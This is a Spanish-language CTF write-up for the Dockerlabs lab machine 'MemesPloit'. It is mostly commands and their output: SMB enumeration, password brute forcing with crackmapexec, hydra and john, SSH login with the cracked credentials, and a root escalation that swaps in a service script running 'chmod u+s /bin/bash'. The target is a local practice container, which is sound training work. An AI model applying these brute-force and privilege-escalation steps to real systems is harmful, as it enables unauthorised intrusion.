
# Writeup Template: Maquina `[ MemesPloit ]`

- Tags: #MemesPloit
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina MemesPloit](https://mega.nz/file/iQ8XCY7a#fYKZCPSXcFWUvV5UzTp5zTIQHuXYw_YbvM9IFGVAiDA)
En el submundo digital, solo los fuertes sobreviven. Este es un mundo donde reina la fuerza bruta siempre, y el conocimiento es el poder supremo. Sumérgete en las capas de código, donde cada línea podría ser una puerta a secretos incalculables.
¿Estás listo para aceptar el desafío ? No se trata solo de romper barreras; se trata de aprovechar cada oportunidad para aprender, adaptarse y conquistar. Los caminos ocultos dentro del mundo cibernético no son para los débiles, sino para quienes se atreven a pensar diferente.
Al navegar por este mundo, recuerda: las llaves del reino a menudo están ocultas a simple vista, oscurecidas por el caos de los datos. Es aquí donde la memehidra yace latente, un testimonio del poder de la persistencia y la búsqueda incesante de la supremacía digital.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x memesploit.zip
sudo bash auto_deploy.sh memesploit.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.58 ((UbuntuNoble))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---
## Enumeracion Servicio `Samba`
Realizamos una enumeracion completa de todo el servicio:
```bash
enum4linux -a 172.17.0.2
```

Tenemos los recursos compartidos:
```bash
==================================( Share Enumeration on 172.17.0.2 )==================================
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share_memehydra Disk      
        IPC$            IPC       IPC Service (4e876123a74e server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                                                                                                                                   
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/share_memehydra    Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:
NT_STATUS_CONNECTION_REFUSED listing \*
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Tenemos usuarios validos:
```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                                                  
S-1-22-1-1001 Unix User\memesploit (Local User)
S-1-22-1-1002 Unix User\memehydra (Local User)
```

Realizaremos un ataque de fuerza bruta para intentar encontrar su contrasena:
**Nota** No obtuvimos nada
```bash
crackmapexec smb 172.17.0.2 -u 'memehydra' -p /usr/share/wordlists/rockyou.txt 
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,pl
```

- **Hallazgos**:
	No reporta nada

Ahora desde la web principal tenemos tres palabras ocultas que podemos ver desde el codigo fuente:
```bash
fuerzabrutasiempre
memesploit_ctf
memehydra
```

Usaremos este como diccionario para el usaurio `memehydra`
```bash
crackmapexec smb 172.17.0.2 -u 'memehydra' -p passwords.txt
SMB         172.17.0.2      445    4E876123A74E     [*] Windows 6.1 Build 0 (name:4E876123A74E) (domain:4E876123A74E) (signing:False) (SMBv1:False)
```

Tenemos las credenciales:
```bash
SMB         172.17.0.2      445    4E876123A74E     [+] 4E876123A74E\memehydra:fuerzabrutasiempre 
```

Ahora nos conectamos a los recursos compartidos de este usuario:
```bash
smbclient //172.17.0.2/share_memehydra -U 'memehydra' --password 'fuerzabrutasiempre'
```

Tenemos este archivo: **secret.zip** el cual nos descargaremos en nuestro equipo local:
```bash
smb: \> get secret.zip
```

Si intentamos extraer su contenido nos pide una contrasnea que no tenemos:
```bash
7z x secret.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_MX.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 224 bytes (1 KiB)

Extracting archive: secret.zip
--
Path = secret.zip
Type = zip
Physical Size = 224
    
Enter password (will not be echoed):
ERROR: Wrong password : secret.txt

Sub items Errors: 1
Break signaled
```

Asi que realizaremos un ataque de fuerza bruta:
```bash
zip2john secret.zip > hash
```

Ahora usaremos el diccionario que previamente habiamos creado con las tres palabras:
```bash
john --wordlist=passwords.txt hash
```

Ahora tenemos la contrasena para ver el archivo:
```bash
Warning: Only 3 candidates left, minimum 16 needed for performance.
memesploit_ctf   (secret.zip/secret.txt)
```

Ahora volvemos a extraer los archivos:
```bash
7z x secret.zip # ( memesploit_ctf )
```

Ahora tenemos este archivo **secret.txt** que si revisamos su contenido tenemos lo siguiente:
```bash
memesploit:metasploitelmejor
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora usaremos esas credenciales para loguearnos por **ssh**
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh memesploit@172.17.0.2 # ( metasploitelmejor )
```

---
## Escalada de Privilegios

###### Usuario `[ Memesploit ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User memesploit may run the following commands on 4e876123a74e:
    (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
```

`login_monitor` **no es una herramienta estándar de Linux**. Por el nombre, podría referirse a:
1. **Un script personalizado**: Creado por administradores para auditar inicios de sesión.
2. **Herramienta de monitoreo**: Como `logind` (parte de systemd) o `lastlog`.
3. **Componente de seguridad**: Como `fail2ban` o `pam_exec`.
Ahora buscamos por archivos relacionados con **login_monitor**
```bash
find / -iname "login_monitor" 2>/dev/null
```

Tenemos lo siguiente:
```bash
/etc/login_monitor
/etc/init.d/login_monitor
```

Ahora lo que aremos es ver los archivos de configuracion:
```bash
ls -la

total 36
drwxrwx---  2 root security 4096 Aug 31  2024 .
drwxr-xr-x 55 root root     4096 Jun 23 20:06 ..
-rwxr-xr-x  1 root root      620 Aug 31  2024 actionban.sh
-rwxr-xr-x  1 root root      472 Aug 31  2024 activity.sh
-rw-r--r--  1 root root      200 Aug 31  2024 loggin.conf
-rw-r--r--  1 root root      224 Aug 31  2024 network.conf
-rwxr-xr-x  1 root root      501 Aug 31  2024 network.sh
-rw-r--r--  1 root root      209 Aug 31  2024 security.conf
-rwxr-xr-x  1 root root      488 Aug 31  2024 security.sh
```

Ahora existe un directorio **.** el cual tiene como grupo propietario **security**, Revisando a los grupos a los que pertenecemos:
```bash
id
uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
```

Y para grupo propietario tenemos capacidad de:
```bash
r = Lectura
w = Escritura
x = Ejecucion
```

Ahora revisamos todos los archivos en busca de un posible fallo:
```bash
cat actionban.sh

#!/bin/bash

# Ruta del archivo que simula el registro de bloqueos
BLOCK_LOG="/tmp/block_log.txt"

# Función para generar una IP aleatoria
generate_random_ip() {
    echo "$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))"
}

# Generar una IP aleatoria
IP_TO_BLOCK=$(generate_random_ip)

# Mensaje de simulación
MESSAGE="Simulación de bloqueo de IP: $IP_TO_BLOCK"

# Mostrar el mensaje en la terminal
echo "$MESSAGE"

# Registrar el intento de bloqueo en el archivo
echo "$(date): $MESSAGE" >> "$BLOCK_LOG"

echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"
```

Ahora lo que aremos es intentar modificar el nombre de este archivo: **actionban.sh**  
```bash
mv actionban.sh actionban.txt
```

Ahora creamos el nuestro malicioso:
```bash
nano actionban.sh
```

con las siguientes instrucciones:
```bash
chmod u+s /bin/bash
```

Ahora lo ejecutamos:
```bash
sudo service login_monitor restart
```

Ahora para que se active realizaremos un ataque de fuerza bruta con **hydra**
```bash
hydra -l memesploit -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

Ahora si listamos los permisos de la **bash** tenemos **SUID**
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
Flags **Root**
```bash
bash-5.2# ls -la /root

-rw-r--r--  1 root root   33 Aug 31  2024 root.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar enumeracion del servicio **SAMBA**
2. Aprendimos a realizar ataque de fuerza bruta a archivos zip con contrasena
3. Aprendimos a explotar servicios de **service**